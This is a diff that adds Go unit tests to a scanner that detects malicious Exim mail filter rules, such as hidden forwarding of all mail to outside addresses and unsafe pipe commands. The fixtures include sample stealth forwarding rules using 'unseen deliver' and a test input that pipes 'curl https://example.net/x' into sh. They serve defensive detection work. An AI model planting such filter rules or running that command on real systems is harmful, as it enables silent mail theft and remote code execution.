@@ -151,15 +151,49 @@ func TestParseEximFilterSingleLineFinishIsNotMatchAll(t *testing.T) {
 	t.Fatalf("single-line finish rule not parsed: %+v", rules)
 }
 
+func TestParseEximFilterUppercaseUnquotedUnseenDeliver(t *testing.T) {
+	rules := parseEximFilter(`IF
+ $HEADER_FROM: MATCHES "@"
+THEN
+ UNSEEN DELIVER dropbox001@gmail.com
+ENDIF
+`)
+	if len(rules) != 1 {
+		t.Fatalf("len(rules) = %d, want 1: %+v", len(rules), rules)
+	}
+	r := rules[0]
+	if !r.matchesAll {
+		t.Fatalf("uppercase MATCHES @ rule should match all mail; condition=%q", r.condition)
+	}
+	if len(r.actions) != 1 {
+		t.Fatalf("len(actions) = %d, want 1: %+v", len(r.actions), r.actions)
+	}
+	a := r.actions[0]
+	if a.verb != "deliver" || a.arg != "dropbox001@gmail.com" || !a.unseen {
+		t.Fatalf("action = %+v, want unseen deliver dropbox001@gmail.com", a)
+	}
+}
+
 func TestConditionMatchesAll(t *testing.T) {
 	tests := []struct {
 		cond string
 		all  bool
 	}{
 		{`$header_from: contains "@"`, true},
+		{`$HEADER_FROM:   CONTAINS   "@"`, true},
+		{`$header_from: matches "@"`, true},
+		{`$header_from: matches ".*@.*"`, true},
+		{`$thisaddress is "*@*"`, true},
 		{`foranyaddress $h_to:,$h_cc: ( $thisaddress contains "@" )`, true},
+		{`$header_from: contains "@" or $header_subject: contains "invoice"`, true},
+		{`$header_from: contains "@" and $header_to: contains "@"`, true},
 		{`$header_to: contains "office@example.com"`, false},
+		{`$header_from: contains "user@domain"`, false},
 		{`$header_from: contains "uniqa.ro"`, false},
+		{`$header_subject: contains "@"`, false},
+		{`not $header_from: contains "@"`, false},
+		{`$header_from: contains "@" and $header_subject: contains "invoice"`, false},
+		{`foranyaddress $h_to:,$h_cc: ( $header_subject: contains "@" )`, false},
 		{`$header_subject: contains "Cod autentificare"`, false},
 		{"", true}, // unconditional
 		{`not first_delivery and error_message`, false},
@@ -168,6 +202,36 @@ func TestConditionMatchesAll(t *testing.T) {
 		if got := conditionMatchesAll(tt.cond); got != tt.all {
 			t.Errorf("conditionMatchesAll(%q) = %v, want %v", tt.cond, got, tt.all)
 		}
+	}
+}
+
+func TestScoreFilterRulesPairsNestedExternalAndLocalCopy(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `headers charset "UTF-8"
+if
+ $header_from: contains "boss@example.net"
+then
+ deliver "dropbox001@gmail.com"
+ if
+  $header_subject: contains "invoice"
+ then
+  deliver "\"$local_part+INBOX\"@$domain"
+ endif
+endif
+`
+	rules := parseEximFilter(body)
+	got := scoreFilterRules(rules, filterMailbox{localPart: "aura", domain: "example.com"}, localDomains, nil)
+	var exfil *filterFinding
+	for i := range got {
+		if got[i].kind == "exfil" {
+			exfil = &got[i]
+		}
+	}
+	if exfil == nil {
+		t.Fatalf("nested local copy should pair with external delivery; got %+v", got)
+	}
+	if exfil.severity != alert.Critical || exfil.onlyIfNew {
+		t.Fatalf("nested pair finding = %+v, want non-gated Critical exfil", *exfil)
 	}
 }
 
@@ -234,6 +298,24 @@ func TestScoreFilterRulesPlainForwardOnlyIfNew(t *testing.T) {
 	}
 }
 
+func TestScoreFilterRulesRestrictiveAndIsPlainForward(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_from: contains "@" and $header_subject: contains "invoice"
+then
+ deliver "owner-personal@gmail.com"
+endif
+`
+	rules := parseEximFilter(body)
+	got := scoreFilterRules(rules, filterMailbox{localPart: "office", domain: "example.com"}, localDomains, nil)
+	if len(got) != 1 {
+		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
+	}
+	if got[0].kind != "forwarder" || got[0].severity != alert.High || !got[0].onlyIfNew {
+		t.Fatalf("restrictive AND finding = %+v, want change-gated forwarder", got[0])
+	}
+}
+
 func TestScoreFilterRulesDevNullInterceptIsStealth(t *testing.T) {
 	localDomains := map[string]bool{"example.com": true}
 	rules := parseEximFilter(filterDevNullIntercept)
@@ -249,6 +331,63 @@ func TestScoreFilterRulesDevNullInterceptIsStealth(t *testing.T) {
 	}
 }
 
+func TestScoreFilterRulesExternalLiteralWithVariableDomain(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_from: contains "boss@example.net"
+then
+ deliver "dropbox001@gmail.com$domain"
+ deliver "\"$local_part+INBOX\"@$domain"
+endif
+`
+	rules := parseEximFilter(body)
+	got := scoreFilterRules(rules, filterMailbox{localPart: "aura", domain: "example.com"}, localDomains, nil)
+	if len(got) != 1 {
+		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
+	}
+	if got[0].kind != "exfil" || got[0].dest != "dropbox001@gmail.com$domain" {
+		t.Fatalf("finding = %+v, want exfil to variable-smuggled external literal", got[0])
+	}
+}
+
+func TestScoreFilterRulesReportsEachExternalDestination(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_from: contains "boss@example.net"
+then
+ deliver "known@gmail.com"
+ deliver "unknown@gmail.com"
+endif
+`
+	rules := parseEximFilter(body)
+	known := []string{"aura@example.com: known@gmail.com"}
+	got := scoreFilterRules(rules, filterMailbox{localPart: "aura", domain: "example.com"}, localDomains, known)
+	if len(got) != 1 {
+		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
+	}
+	if got[0].dest != "unknown@gmail.com" || got[0].kind != "forwarder" || !got[0].onlyIfNew {
+		t.Fatalf("finding = %+v, want unsuppressed change-gated second external destination", got[0])
+	}
+}
+
+func TestScoreFilterRulesUnseenDeliverIsStealth(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	body := `if
+ $header_from: contains "boss@example.net"
+then
+ unseen deliver "dropbox001@gmail.com"
+endif
+`
+	rules := parseEximFilter(body)
+	got := scoreFilterRules(rules, filterMailbox{localPart: "aura", domain: "example.com"}, localDomains, nil)
+	if len(got) != 1 {
+		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
+	}
+	if got[0].kind != "exfil" || got[0].severity != alert.Critical || got[0].onlyIfNew {
+		t.Fatalf("unseen deliver finding = %+v, want non-gated Critical exfil", got[0])
+	}
+}
+
 func TestScoreFilterRulesSuppressedByKnownForwarder(t *testing.T) {
 	localDomains := map[string]bool{"example.com": true}
 	rules := parseEximFilter(filterPlainForward)
@@ -256,6 +395,28 @@ func TestScoreFilterRulesSuppressedByKnownForwarder(t *testing.T) {
 	got := scoreFilterRules(rules, filterMailbox{localPart: "office", domain: "example.com"}, localDomains, known)
 	if len(got) != 0 {
 		t.Fatalf("known forwarder must be suppressed; got %+v", got)
+	}
+}
+
+func TestScoreFilterRulesKnownForwarderDoesNotSuppressStealth(t *testing.T) {
+	localDomains := map[string]bool{"example.com": true}
+	rules := parseEximFilter(filterAuraStealth)
+	known := []string{"aura@example.com: dropbox001@gmail.com"}
+	got := scoreFilterRules(rules, filterMailbox{localPart: "aura", domain: "example.com"}, localDomains, known)
+	if len(got) != 1 {
+		t.Fatalf("len(findings) = %d, want 1: %+v", len(got), got)
+	}
+	if got[0].kind != "exfil" || got[0].severity != alert.Critical || got[0].onlyIfNew {
+		t.Fatalf("known stealth finding = %+v, want non-gated Critical exfil", got[0])
+	}
+}
+
+func TestIsSafePipeRejectsCommandThatOnlyMentionsSafeBinary(t *testing.T) {
+	if !isSafePipe("/usr/local/cpanel/bin/autorespond --account user@example.com") {
+		t.Fatal("expected direct cPanel autorespond pipe to be safe")
+	}
+	if isSafePipe("/bin/sh -c '/usr/local/cpanel/bin/autorespond; curl https://example.net/x | sh'") {
+		t.Fatal("command that only mentions a safe cPanel pipe must still be reported")
 	}
 }
 
@@ -272,6 +433,33 @@ func TestMailboxFromFilterPath(t *testing.T) {
 		if got != tt.mb {
 			t.Errorf("mailboxFromFilterPath(%q) = %+v, want %+v", tt.path, got, tt.mb)
 		}
+	}
+}
+
+func TestAnnotateCrossAccountThreeMailboxes(t *testing.T) {
+	collected := []mailFilterPending{
+		{finding: alert.Finding{Details: "first"}, dest: "shared@gmail.com", mailbox: "a@example.com"},
+		{finding: alert.Finding{Details: "second"}, dest: "shared@gmail.com", mailbox: "b@example.com"},
+		{finding: alert.Finding{Details: "third"}, dest: "shared@gmail.com", mailbox: "c@example.com"},
+	}
+
+	annotateCrossAccount(collected)
+
+	for _, p := range collected {
+		if p.finding.Severity != alert.Critical {
+			t.Fatalf("%s severity = %v, want Critical", p.mailbox, p.finding.Severity)
+		}
+		if !strings.Contains(p.finding.Details, "used by 3 mailboxes") {
+			t.Fatalf("%s details missing 3-mailbox count: %q", p.mailbox, p.finding.Details)
+		}
+		if strings.Contains(p.finding.Details, "also "+p.mailbox) {
+			t.Fatalf("%s details include itself as another mailbox: %q", p.mailbox, p.finding.Details)
+		}
+	}
+	if !strings.HasPrefix(collected[0].finding.Details, "first\n") ||
+		!strings.HasPrefix(collected[1].finding.Details, "second\n") ||
+		!strings.HasPrefix(collected[2].finding.Details, "third\n") {
+		t.Fatalf("annotation overwrote per-finding details: %+v", collected)
 	}
 }
 
